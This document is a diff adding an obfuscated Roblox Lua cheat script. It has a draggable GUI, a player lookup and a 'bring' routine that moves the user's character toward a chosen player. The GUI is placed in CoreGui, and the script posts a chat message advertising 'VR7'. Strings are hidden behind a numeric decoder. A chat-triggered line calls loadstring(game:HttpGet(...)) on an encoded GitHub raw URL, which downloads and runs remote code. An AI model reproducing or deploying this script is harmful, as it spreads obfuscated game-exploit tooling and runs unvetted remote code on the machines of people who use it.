+			dragStart=window.Position
+			if rendersteppedcon then rendersteppedcon:Disconnect() end
+			rendersteppedcon = renderstepped:Connect(rendersteppedf)
+			if inputendedcon then inputendedcon:Disconnect() end
+			inputendedcon = uis.InputEnded:Connect(inputendedf)
+		end
+	end
+	obj.MouseEnter:Connect(function()
+		if inputbegancon then inputbegancon:Disconnect() end
+		inputbegancon = uis.InputBegan:Connect(inputbeganf)
+	end)
+	obj.MouseLeave:Connect(function()
+		inputbegancon:Disconnect()
+	end)
+	local function ondes(d)
+		if d:IsA(dVioinolDtcLyyLPPWDofqzcv({7455,12285,11025,8295,10290,11130,10605,10395,12180})) then
+			local thisEntered = false
+			local thisAdded = false
+			local con0 = d.MouseEnter:Connect(function()
+				thisEntered = true
+				if (not thisAdded) and d.Active then
+					activeEntered = activeEntered + 1
+					thisAdded = true
+				end
+			end)
+			local con1 = d.MouseLeave:Connect(function()
+				thisEntered = false
+				if thisAdded then
+					activeEntered = activeEntered - 1
+					thisAdded = false
+				end
+			end)
+			local con2 = d:GetPropertyChangedSignal(dVioinolDtcLyyLPPWDofqzcv({6825,10395,12180,11025,12390,10605})):Connect(function()
+				if thisEntered then
+					if thisAdded and not d.Active then
+						activeEntered = activeEntered - 1
+						thisAdded = false
+					elseif d.Active and not thisAdded then
+						activeEntered = activeEntered + 1
+						thisAdded = true
+					end
+				end
+			end)
+			local con3 = nil
+			con3 = d.AncestryChanged:Connect(function()
+				if not d:IsDescendantOf(window) then
+					if thisEntered then
+						activeEntered = activeEntered - 1
+					end
+					con0:Disconnect()
+					con1:Disconnect()
+					con2:Disconnect()
+					con3:Disconnect()
+				end
+			end)
+		end
+	end
+	window.DescendantAdded:Connect(ondes)
+	local des=window:GetDescendants()
+	for i=1,#des do 
+		ondes(des[i])
+	end
+end
+Draggable(i1)
+
+local others={}
+for i,v in pairs(plrs:GetPlayers()) do
+	if v~=lp then
+		others[v]=true
+	end
+end
+plrs.PlayerAdded:Connect(function(plr)
+	others[plr]=true
+end)
+local function findplr(txt)
+	if txt==dVioinolDtcLyyLPPWDofqzcv({}) then
+		return nil
+	end
+	for v,_ in pairs(others) do
+		if v.DisplayName==txt then
+			return v
+		end
+	end
+	for v,_ in pairs(others) do
+		if v.Name==txt then
+			return v
+		end
+	end
+	local lower=slower(txt)
+	for v,_ in pairs(others) do
+		if slower(v.DisplayName)==lower then
+			return v
+		end
+	end
+	for v,_ in pairs(others) do
+		if slower(v.Name)==lower then
+			return v
+		end
+	end
+	local l=#txt
+	for v,_ in pairs(others) do
+		if ssub(v.DisplayName,l,l)==txt then
+			return v
+		end
+	end
+	for v,_ in pairs(others) do
+		if ssub(v.Name,l,l)==txt then
+			return v
+		end
+	end
+	for v,_ in pairs(others) do
+		if slower(ssub(v.DisplayName,l,l))==lower then
+			return v
+		end
+	end
+	for v,_ in pairs(others) do
+		if slower(ssub(v.Name,l,l))==lower then
+			return v
+		end
+	end
+	return nil
+end
+local target=nil
+i4:GetPropertyChangedSignal(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180})):Connect(function()
+	local txt=i4.Text
+	target=findplr(txt)
+	if target then
+		if (target.DisplayName) and (target.DisplayName~=dVioinolDtcLyyLPPWDofqzcv({})) and (target.DisplayName~=target.Name) then
+			i7.Text=target.DisplayName..dVioinolDtcLyyLPPWDofqzcv({3360,6720})..target.Name
+		else
+			i7.Text=dVioinolDtcLyyLPPWDofqzcv({6720})..target.Name
+		end
+		i5.TextColor3=c3(0.301961,1,0) 
+	else
+		i7.Text=dVioinolDtcLyyLPPWDofqzcv({})
+		i5.TextColor3=c3(0.55,0.55,0.55) 
+	end
+end)
+plrs.PlayerRemoving:Connect(function(plr)
+	others[plr]=nil
+	if plr==target then
+		target=nil
+		i7.Text=dVioinolDtcLyyLPPWDofqzcv({})
+		i5.TextColor3=c3(0.55,0.55,0.55) 
+	end
+end)
+local notifyid=0
+local function notify(txt)
+	notifyid=notifyid+1
+	local thisid=notifyid
+	i6.Text=txt
+	twait(2)
+	if notifyid==thisid then
+		i6.Text=dVioinolDtcLyyLPPWDofqzcv({22785,13965,22785,13860,22680,17535,22680,18165,22680,19320,22785,14175,3360,22785,13860,22680,17535,22680,18690,22785,13965,3360,22680,17535,22785,13860,22680,17535,22680,19425,22680,17640,3360,22785,13965,22680,17535,22785,14490,22680,17850,22680,18165,22680,18585,22785,13755})
+	end
+end
+local bringing=false
+i5.MouseButton1Click:Connect(function()
+	if bringing then
+		bringing=false
+		i5.Text=dVioinolDtcLyyLPPWDofqzcv({6930,8610,7665,8190,7455})
+		return
+	end
+	if not target then
+		return
+	end
+	local c=lp.Character
+	local c1=target.Character
+	if not (c and c1) then
+		return notify(dVioinolDtcLyyLPPWDofqzcv({11550,11655,3360,10395,10920,10185,11970,10185,10395,12180,10605,11970}))
+	end
+	if not (c:IsDescendantOf(ws) and c1:IsDescendantOf(ws)) then
+		return notify(dVioinolDtcLyyLPPWDofqzcv({10395,10920,10185,11970,10185,10395,12180,10605,11970,3360,11550,11655,12180,3360,11025,11550,3360,12495,11655,11970,11235,12075,11760,10185,10395,10605}))
+	end
+	local hrp=gp(c,dVioinolDtcLyyLPPWDofqzcv({7560,12285,11445,10185,11550,11655,11025,10500,8610,11655,11655,12180,8400,10185,11970,12180}),dVioinolDtcLyyLPPWDofqzcv({6930,10185,12075,10605,8400,10185,11970,12180}))
+	local hrp1=gp(c1,dVioinolDtcLyyLPPWDofqzcv({7560,12285,11445,10185,11550,11655,11025,10500,8610,11655,11655,12180,8400,10185,11970,12180}),dVioinolDtcLyyLPPWDofqzcv({6930,10185,12075,10605,8400,10185,11970,12180}))
+	if not (hrp and hrp1) then
+		return notify(dVioinolDtcLyyLPPWDofqzcv({11550,11655,3360,10920,12285,11445,10185,11550,11655,11025,10500,11970,11655,11655,12180,11760,10185,11970,12180}))
+	end
+	bringing=true
+	i5.Text=dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17535,22785,13860,22680,18795,22680,18165,22680,17640}) 
+	local from=hrp1.CFrame
+	local fromP=from.Position
+	local to=hrp.CFrame
+	local toP=to.Position
+	local mag=(fromP-toP).Magnitude-3
+	local lv=cf(fromP,toP).LookVector
+	local vel=0
+	local pos=from.Position-v3_010*2
+	toP=toP-v3_010*2
+
+	local sine=osclock()
+	local lastsine=sine
+	local way=0
+	local reachedmaxspeed=false
+	while bringing and c:IsDescendantOf(ws) and c1:IsDescendantOf(ws) do
+		sine=osclock()
+		local deltaTime=sine-lastsine
+		lastsine=sine
+		if reachedmaxspeed then
+			if mag-way<reachedmaxspeed then
+				vel=vel-deltaTime*speeding
+				if vel<0 then
+					break
+				end
+			end
+		else
+			if way>mag/2 then
+				vel=vel-deltaTime*speeding
+				if vel<0 then
+					break
+				end
+			else
+				vel=vel+deltaTime*speeding
+				if vel>maxspeed then
+					reachedmaxspeed=way
+					vel=maxspeed
+				end
+			end
+		end
+		way=way+vel*deltaTime
+		if not hrp:IsGrounded() then
+			hrp.CFrame=cf(pos+lv*way,toP)*off
+			hrp.Velocity=lv*(vel+1)
+			hrp.RotVelocity=v3_0
+		end
+		twait()
+	end
+	hrp.CFrame=to
+	hrp.Velocity=v3_0
+	hrp.RotVelocity=v3_0
+	bringing=false
+	i5.Text=dVioinolDtcLyyLPPWDofqzcv({22680,18795,22680,18165,22680,17640})
+end)
+local iscg,_=pcall(function()
+	i8.Parent=game:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({7035,11655,11970,10605,7455,12285,11025}))
+end)
+if not iscg then
+	i8.Parent=lp:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({8400,11340,10185,12705,10605,11970,7455,12285,11025}))
+end
+
+game.StarterGui:SetCore(dVioinolDtcLyyLPPWDofqzcv({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),  {
+ Title = dVioinolDtcLyyLPPWDofqzcv({22785,13545,22680,19425,22785,13860,3360,22785,13965,22785,14490,22680,18690,22680,17745,3360,22785,13965,22680,18165,22680,18375,3360,22785,14490,22785,13650,22680,18375,22680,18585,3360,22785,14490,22680,18375,22785,13545,22785,13755});
+ Text = dVioinolDtcLyyLPPWDofqzcv({7245,11550,11130,11655,12705,4200,6090});
+ Icon = dVioinolDtcLyyLPPWDofqzcv({});
+ Duration = 5;
+ Callback = NotificationBindable;
+})
+
+print(dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17850,22680,18900,22680,19530,22785,14490,22785,13860,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585}))
+-- نهايه
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = dVioinolDtcLyyLPPWDofqzcv({3465,22785,13545,22785,13860,22785,14490,22785,14070,22785,13650}) -- 
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet(dVioinolDtcLyyLPPWDofqzcv({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,5040,6930,10605,11550,5145,4935,10710,10605,4830,4935,11445,10185,11025,11550,4935,7350,11340,11025,11550,10815,3885,5250,5040,7455,8925,7665})))()
+print(dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17850,22680,18900,22680,19530,22785,14490,22785,13860,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585}))
+-- نهايه
+end
+end)
+
+game.StarterGui:SetCore(dVioinolDtcLyyLPPWDofqzcv({8715,10605,11550,10500,8190,11655,12180,11025,10710,11025,10395,10185,12180,11025,11655,11550}),  {
+ Title = dVioinolDtcLyyLPPWDofqzcv({22680,17535,22785,13860,22680,17535,22785,14280,22680,17535,22785,13965,22680,18585,3360,4725,3360,3465,22680,18795,22680,18165,22680,17640,3360,4725,3360,3465,22680,18585,22680,18060,22785,13860,3360,4725,3360,3465,22785,14175,22680,18375,22785,13860,22680,18795,3360,4725,3360,3465,22785,13545,22785,13860,22785,14490,22785,14070,22785,13650,3360,4725,3360,3465,22680,17850,22680,19425,22785,13860,22785,14490,22785,13650,3360,22680,17535,22785,13860,22680,18795,22785,14490,22680,18585,22785,13545,22680,18585});
+ Text = dVioinolDtcLyyLPPWDofqzcv({22680,17535,22785,13755,22680,17850,22680,17640,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585,3360,22785,13965,22680,19425,3360,3465});
+ Icon = dVioinolDtcLyyLPPWDofqzcv({});
+ Duration = 5;
+ Callback = NotificationBindable;
+})    
+
+local args = {
+    [1] = "\216\167\217\132\216\185\217\133 VR7",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
